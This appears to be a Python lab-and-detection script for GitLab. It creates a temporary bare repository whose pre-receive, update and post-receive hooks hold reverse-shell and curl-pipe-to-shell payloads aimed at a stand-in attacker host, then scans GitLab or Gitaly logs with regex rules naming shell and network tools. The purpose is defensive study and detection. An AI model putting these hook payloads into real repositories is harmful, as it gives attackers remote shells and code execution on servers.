"""
GitLab Authenticated RCE via Malicious Git Push Lab

Builds a disposable bare-repo sandbox demonstrating how a crafted git push
can trigger server-side hook execution in GitLab self-managed instances,
then scans plain-text GitLab production or Gitaly log exports for anomalous
git subprocess spawning patterns indicating active exploitation.

Usage:
    python gitlab_rce_push_lab.py                           # lab only
    python gitlab_rce_push_lab.py prod.log                  # lab + scan
    python gitlab_rce_push_lab.py prod.log --mode scan      # scan only
    python gitlab_rce_push_lab.py --mode lab                # lab only
    python gitlab_rce_push_lab.py prod.log --severity high  # high severity only
"""
import argparse
import os
import re
import stat
import sys
import tempfile
from collections import defaultdict
from datetime import datetime

HOOKS = {
    "hooks/pre-receive": (
        "#!/bin/sh\nbash -i >& /dev/tcp/attacker.example.com/4444 0>&1\n",
        "pre-receive", "ShellExec — fires before refs updated; spawns reverse shell before any ref is written"),
    "hooks/update": (
        "#!/bin/sh\ncurl -fsSL http://attacker.example.com/payload.sh | sh\n",
        "update", "CurlPipe — fires once per ref; downloads and executes remote stage-2 payload via shell pipe"),
    "hooks/post-receive": (
        "#!/bin/sh\npython3 -c \"import socket,os,pty;s=socket.socket();s.connect(('attacker.example.com',4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn('/bin/sh')\"\n",
        "post-receive", "PythonExec — fires after all refs written; spawns interactive PTY reverse shell via Python3"),
}
SEVERITY_RANK = {"low": 0, "medium": 1, "high": 2}
TS_RE = re.compile(r"(\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2})")
USER_RE = re.compile(r'(?:username|user)[=:"]\s*([A-Za-z0-9_.\-]+)', re.I)
REPO_RE = re.compile(r"(/[^\s\"']*?\.git)\b")
REPLAY_RE = re.compile(r"\b(pre.?receive|post.?receive|update)\b", re.I)
RULES = [
    ("HookInjection", "high",
     re.compile(r"(pre.?receive|post.?receive|update).*\b(sh|bash|python\d*|perl|ruby|curl|wget)\b", re.I),
     "Restrict hooks to allowlisted signed scripts; re-audit hooks/ directory on every GitLab upgrade."),
    ("SubprocessEscape", "high",
     re.compile(r"(gitlab.?shell|gitaly.?git2go)\b.*\b(curl|wget|python\d*|bash|/bin/sh|nc|ncat)\b", re.I),
     "Apply AppArmor/seccomp profiles to Gitaly; block network syscalls from hook child processes."),
    ("SubprocessEscape", "medium",
     re.compile(r"(hook|pre.?receive|post.?receive).*(\.\./|/etc/|/proc/|/tmp/)", re.I),
     "Validate hook argument paths stay within repository root; reject out-of-repo path segments."),
]
REPLAY_MIT = "Rate-limit hook calls per user-repo pair; suspend accounts exceeding 5 invocations in 60 s."


def setup_lab() -> str:
    sandbox = tempfile.mkdtemp(prefix="gitlab_rce_lab_")
    os.makedirs(os.path.join(sandbox, "hooks"))
    print("[LAB] Poisoned bare-repo sandbox:")
    for rel, (content, stage, note) in HOOKS.items():
        path = os.path.join(sandbox, rel)
        with open(path, "w") as fh:
            fh.write(content)
        os.chmod(path, os.stat(path).st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
        print(f"  {rel:<32} [{stage:<12}] {note}")
    print(f"[LAB] Sandbox: {sandbox}  (temp — remove after review)\n")
    return sandbox


def scan_logs(log_file: str, min_severity: str):
    min_rank = SEVERITY_RANK[min_severity]
    replay = defaultdict(list)
    try:
        fh = open(log_file, errors="replace")
    except OSError as exc:
        print(f"[ERROR] Cannot open log file: {exc}", file=sys.stderr)
        sys.exit(2)
    with fh:
        for raw in fh:
            line = raw.rstrip()
            ts_m = TS_RE.search(line)
            user_m = USER_RE.search(line)
            repo_m = REPO_RE.search(line)
            user = user_m.group(1) if user_m else "unknown"
            repo = repo_m.group(1) if repo_m else ""
            if ts_m and REPLAY_RE.search(line):
                try:
                    epoch = int(datetime.fromisoformat(ts_m.group(1).replace(" ", "T")).timestamp())
                    key = (user, repo)
                    recent = [t for t in replay[key] if epoch - t <= 60]
                    recent.append(epoch)
                    replay[key] = recent
                    if len(recent) > 5 and SEVERITY_RANK["medium"] >= min_rank:
                        yield "RapidHookReplay", "medium", line[:120], REPLAY_MIT
                        continue
                except ValueError:
                    pass
            for technique, severity, pattern, mitigation in RULES:
                if SEVERITY_RANK[severity] < min_rank:
                    continue
                if pattern.search(line):
                    yield technique, severity, line[:120], mitigation
                    break


def report(findings) -> bool:
    counts = defaultdict(int)
    peak, any_high = "low", False
    for technique, severity, snippet, mitigation in findings:
        counts[technique] += 1
        if SEVERITY_RANK[severity] > SEVERITY_RANK[peak]:
            peak = severity
        any_high = any_high or severity == "high"
        print(f"[{severity.upper():<6}] [{technique}] {snippet}")
        print(f"         Mitigation: {mitigation}\n")
    print("--- Summary " + "-" * 40)
    if counts:
        for tech, count in sorted(counts.items()):
            print(f"  {tech:<22} {count:>4} hit(s)")
    else:
        print("  No findings at or above the minimum severity threshold.")
    print(f"  Peak severity: {peak.upper()}")
    return any_high


def main():
    parser = argparse.ArgumentParser(description="GitLab authenticated RCE push lab and log scanner")
    parser.add_argument("log_file", nargs="?", help="GitLab production.log or Gitaly log export")
    parser.add_argument("--mode", choices=["lab", "scan", "both"], default="both")
    parser.add_argument("--severity", choices=["low", "medium", "high"], default="low")
    args = parser.parse_args()
    if args.mode == "scan" and not args.log_file:
        parser.error("--mode scan requires a log_file argument")
    if args.mode in ("lab", "both"):
        setup_lab()
    any_high = False
    if args.mode in ("scan", "both") and args.log_file:
        any_high = report(scan_logs(args.log_file, args.severity))
    sys.exit(1 if any_high else 0)


if __name__ == "__main__":
    main()